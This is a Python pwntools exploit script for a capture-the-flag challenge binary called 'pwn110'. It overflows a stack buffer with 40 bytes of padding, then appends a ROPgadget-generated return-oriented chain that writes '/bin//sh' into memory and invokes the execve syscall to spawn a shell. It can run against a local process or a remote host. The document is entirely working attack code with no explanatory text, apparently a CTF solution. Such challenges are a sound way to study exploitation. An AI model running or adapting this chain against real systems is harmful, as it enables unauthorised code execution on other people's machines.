from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "pwn110.pwn110"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Well done, Now try to pwn me without libc", content)

x, p = init()

def rp(x): return ROP(exe).find_gadget(x)[0]

payload = b'A'*40
# generated by: ROPgadget --binary pwn110.pwn110 --ropchain
payload += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
payload += pack('<Q', 0x00000000004c00e0) # @ .data
payload += pack('<Q', 0x00000000004497d7) # pop rax ; ret
payload += b'/bin//sh'
payload += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
payload += pack('<Q', 0x00000000004c00e8) # @ .data + 8
payload += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x000000000040191a) # pop rdi ; ret
payload += pack('<Q', 0x00000000004c00e0) # @ .data
payload += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
payload += pack('<Q', 0x00000000004c00e8) # @ .data + 8
payload += pack('<Q', 0x000000000040181f) # pop rdx ; ret
payload += pack('<Q', 0x00000000004c00e8) # @ .data + 8
payload += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
payload += pack('<Q', rp(['pop rax', 'ret']))
payload += pack('<Q', 59)
payload += pack('<Q', 0x00000000004012d3) # syscall

x.debug("break *main+75\nc")
x.send(payload)

p.interactive()